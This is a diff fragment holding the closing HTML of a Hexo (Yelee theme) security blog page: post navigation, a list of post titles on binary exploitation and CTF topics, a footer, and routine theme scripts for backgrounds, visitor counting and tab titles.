+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/12/16/Fmtstr/FmtStr_Blind_Got/" title="Pre: FmtStr Blind Got">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/12/09/%E9%9A%8F%E7%AC%94/Pwn%E9%9A%8F%E7%AC%94/" title="Next: Pwn随笔">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/Large%20BIN%20Attack/Large-Bin-Attack/">Large_Bin_Attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/GMF/Global_Max_Fast/">Global_Max_Fast</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/31/IO_FILE/IO_FILE/">IO_FILE</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/18/TCache/TCache/">TCache</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/14/Competition/GXZY/">GXZY</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/01/Competition/V-N/">V&N公开赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/25/Competition/GYCTF/">GYCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/22/Competition/HGame/">HGame</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/15/StackOverFlow/Advanced-ROP/">延迟绑定</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/13/Seccomp/Seccomp/">Seccomp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/27/StackOverFlow/BROP/">BROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/Reverse/Reverse-BOX/">Reverse_BOX</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/20/Reverse/WcyVM/">NCTF_WcyVM</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/17/Fmtstr/FmtStr_In_Heap/">FmtStr In Heap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/16/Fmtstr/FmtStr_Blind_Got/">FmtStr Blind Got</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/10/StackOverFlow/ROP/">ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/09/%E9%9A%8F%E7%AC%94/Pwn%E9%9A%8F%E7%AC%94/">Pwn随笔</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/08/Fmtstr/FmtStr_In_Bss/">FmtStr In BSS</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2020 风沐云烟
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-area-chart" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-coffee" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 7;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "φ(≧ω≦*)♪ 嘿 ^我消失啦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "Hi~ o(*￣▽￣*)ブ 被你发现啦～" + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
